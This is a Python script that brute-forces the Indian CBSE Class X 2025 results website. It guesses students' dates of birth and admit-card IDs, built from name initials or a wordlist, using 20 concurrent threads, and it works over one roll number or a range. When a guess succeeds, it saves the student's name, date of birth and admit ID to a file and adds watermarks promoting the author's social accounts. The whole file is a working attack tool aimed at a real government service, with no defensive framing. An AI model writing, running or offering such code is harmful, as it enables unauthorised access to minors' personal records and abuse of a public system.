import requests
import string
from bs4 import BeautifulSoup
from datetime import datetime, timedelta
from itertools import product
from concurrent.futures import ThreadPoolExecutor, as_completed

URL = "https://cbseresults.nic.in/class_x_jh_2025/ClassTenth_po_2025.asp"
HEADERS = {
    "Host": "cbseresults.nic.in",
    "Referer": "https://cbseresults.nic.in/class_x_jh_2025/ClassTenth_po_2025.htm",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
}
EXPRESSION = "ENGLISH"


def iterate_dobs(start_year, end_year):
    start = datetime(start_year, 1, 1)
    end = datetime(end_year, 12, 31)
    delta = timedelta(days=1)
    while start <= end:
        yield start.strftime("%d/%m/%Y")
        start += delta


def brute(session, admid, regno, dob, sch, cno):
    data = {
        'regno': regno,
        'sch': sch,
        'cno': cno,
        'admid': admid,
        'dob': dob,
        'B2': 'Submit',
    }
    try:
        r = session.post(URL, data=data, timeout=10)
        return r.text if EXPRESSION in r.text else None
    except requests.RequestException:
        return None


def build_tasks(regno, sch, cno, prefixes, dob_list):
    sch_prefix = sch[:2]
    return [
        (dob, f"{p}{regno[5]}{regno[6]}{sch_prefix}{cno}")
        for dob, p in product(dob_list, prefixes)
        if len(p) == 2 and p.isalpha()
    ]


def find_valid(session, tasks, regno, sch, cno, log_every, max_workers=20):
    attempt = 0
    with ThreadPoolExecutor(max_workers=max_workers) as pool:
        futures = {
            pool.submit(brute, session, admid, regno, dob, sch, cno): (dob, admid)
            for dob, admid in tasks
        }
        for fut in as_completed(futures):
            attempt += 1
            dob, admid = futures[fut]
            if log_every:
                print(f"Attempt {attempt}: Roll={regno}, School={sch}, Centre={cno}, AdmitID={admid}, DOB={dob}")
            else:
                if attempt % 100 == 0:
                    print(f"Tried {attempt:,} combinations…", end='\r')
            html = fut.result()
            if html:
                pool.shutdown(wait=False, cancel_futures=True)
                if not log_every:
                    print()
                return html, dob, admid
    if not log_every:
        print()
    return None, None, None


def parse_candidate_name(html):
    soup = BeautifulSoup(html, 'html.parser')
    label_td = soup.find(lambda tag: tag.name == 'td' and 'Candidate Name' in tag.text)
    return label_td.find_next_sibling('td').get_text(strip=True) if label_td else "Unknown"


def sanitize_filename(name):
    return "".join(c for c in name if c.isalnum() or c in (' ', '_')).rstrip().replace(' ', '_')


def process_roll(regno, sch, cno, prefixes, dob_list, log_every):
    tasks = build_tasks(regno, sch, cno, prefixes, dob_list)
    print(f"[+] Roll {regno}: {len(tasks):,} combinations")
    session = requests.Session()
    session.headers.update(HEADERS)
    return find_valid(session, tasks, regno, sch, cno, log_every)


def main():
    # Ask fixed or range
    mode = input("Use fixed roll number or range? (fixed/range): ").strip().lower()
    if mode == 'range':
        start_roll = input("Enter start Roll Number: ").strip()
        end_roll = input("Enter end Roll Number: ").strip()
        # enforce fixed DOB for range mode
        dob_input = input("Enter fixed Date of Birth (DD/MM/YYYY): ").strip()
        try:
            datetime.strptime(dob_input, "%d/%m/%Y")
        except ValueError:
            print("❌ Invalid date format. Use DD/MM/YYYY.")
            return
        dob_list = [dob_input]
        rolls = [str(r).zfill(len(start_roll)) for r in range(int(start_roll), int(end_roll) + 1)]
    else:
        roll = input("Enter Roll Number: ").strip()
        rolls = [roll]
        dob_input = input("Enter Date of Birth (DD/MM/YYYY) [leave blank to brute]: ").strip()
        if dob_input:
            try:
                datetime.strptime(dob_input, "%d/%m/%Y")
            except ValueError:
                print("❌ Invalid date format. Use DD/MM/YYYY.")
                return
            dob_list = [dob_input]
        else:
            start_year = int(input("Start year for brute (e.g., 2008): ").strip())
            end_year = int(input("End year for brute (e.g., 2009): ").strip())
            dob_list = list(iterate_dobs(start_year, end_year))

    sch = input("Enter your School Code: ").strip()
    cno = input("Enter middle two digits of Centre Code (eg for 816077, will be 60): ").strip()
    log_pref = input("Log every attempt? (yes/no) [no]: ").strip().lower()
    log_every = log_pref in ('yes', 'y')

    fi = input("First initial [A–Z, blank=any]: ").upper().strip()
    si = input("Second initial [A–Z, blank=any]: ").upper().strip()
    alpha = string.ascii_uppercase
    if fi and si:
        prefixes = [fi + si]
    elif fi:
        prefixes = [fi + x for x in alpha]
    elif si:
        prefixes = [x + si for x in alpha]
    else:
        with open('wl.txt', encoding='utf-8') as f:
            prefixes = [l.strip().upper() for l in f if l.strip()]

    # Process each roll
    for regno in rolls:
        html, used_dob, used_admid = process_roll(regno, sch, cno, prefixes, dob_list, log_every)
        if html:
            candidate = parse_candidate_name(html)
            fname = sanitize_filename(candidate) + ".txt"
            with open(fname, 'w', encoding='utf-8') as f:
                f.write(f"Candidate Name : {candidate}\n")
                f.write(f"Roll No        : {regno}\n")
                f.write(f"Date of Birth  : {used_dob}\n")
                f.write(f"Admit Card ID  : {used_admid}\n")
                # watermarks
                f.write("\n---\n")
                f.write("by https://github.com/Soapdevs\n")
                f.write("follow https://instagram.com/rmps_memes\n")
            print(f"\n✅ Success! Saved details for {candidate} in {fname}")
            break
    else:
        print("\n❗ Could not find a valid combination for any roll.")


if __name__ == '__main__':
    main()
